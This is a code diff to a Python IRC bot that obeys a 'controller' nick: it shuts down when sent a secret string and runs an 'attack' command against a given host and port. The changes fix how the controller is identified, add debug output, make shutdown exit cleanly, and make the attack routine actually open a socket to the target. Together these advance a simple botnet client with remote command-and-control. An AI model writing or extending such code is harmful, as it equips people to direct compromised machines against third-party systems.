@@ -31,6 +31,7 @@ class Bot:
     CONNECTED_SOCKET = False
     CONNECTED_SERVER = False
     JOINED = False
+    SHUTDOWN = False
 
     def parse(self):
         """ Parse the arguments """
@@ -138,7 +139,7 @@ class Bot:
     def cmds(self, data):
         """ Listen for commands """
 
-        print("DEBUG: "  + data)
+        print("DEBUG cmd: "  + data)
 
         data = data.split(":")
 
@@ -146,14 +147,17 @@ class Bot:
         msg = data[-1]
         sender = data[1].split("!")[0]
 
-        print("DEBUG: " + msg)
-        print("DEBUG: " + sender)
+        print("DEBUG msg: " + msg)
+        print("DEBUG sender: " + sender)
 
         # check if controller
-        if self.CONTROLLER is None:
+        if self.CONTROLLER is None and sender != "edel" + str(self.NICK_COUNT):
+            print("DEBUG senderF: " + sender)
             self.CONTROLLER = sender
 
-        if self.CONNECTED_SERVER == sender:
+        if self.CONTROLLER == sender:
+            print("DEBUG senderT: " +sender)
+
             # shutdown bot
             if ("shutdown " + self.SECRET) in msg:
                 self.shutdown()
@@ -166,6 +170,10 @@ class Bot:
                 port = msg[2]
 
                 self.attack(host, port)
+        
+        else:
+            print("DEBUG")
+            return
 
     def close_socket(self, sckt):
         """ Close a connection """
@@ -231,6 +239,8 @@ class Bot:
         # connect
         try:
             attack_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            attack_socket.connect((host, port))
+            
             self.send_msg()
 
         finally:
@@ -248,13 +258,13 @@ class Bot:
     def shutdown(self):
         """ Shutdown the bot """
 
-        msg = "PRIVMSG #" + self.CHANNEL + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET + "\n"
+        msg = "PRIVMSG " + self.CONTROLLER + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET + "\n"
 
         self.send_msg(msg)
 
         print("Terminating bot...")
 
-        # sys.exit(0)
+        self.SHUTDOWN = True
 
         return
 
@@ -305,11 +315,15 @@ class Bot:
                     next_msg = self.MESSAGES[socket].get_nowait()
 
                 except queue.Empty:
+                    if self.SHUTDOWN:
+                        sys.exit(0)
                     continue
 
                 else:
                     # send the msg
                     socket.send(next_msg)
+
+
 
 def run():
     """ Run the client """
@@ -321,7 +335,6 @@ def run():
         # check if connected
         if bot.CONNECTED_SOCKET:
             bot.run()
-
         else:
             # wait 5 seconds before reconnecting
             print("Attempting reconnection...")
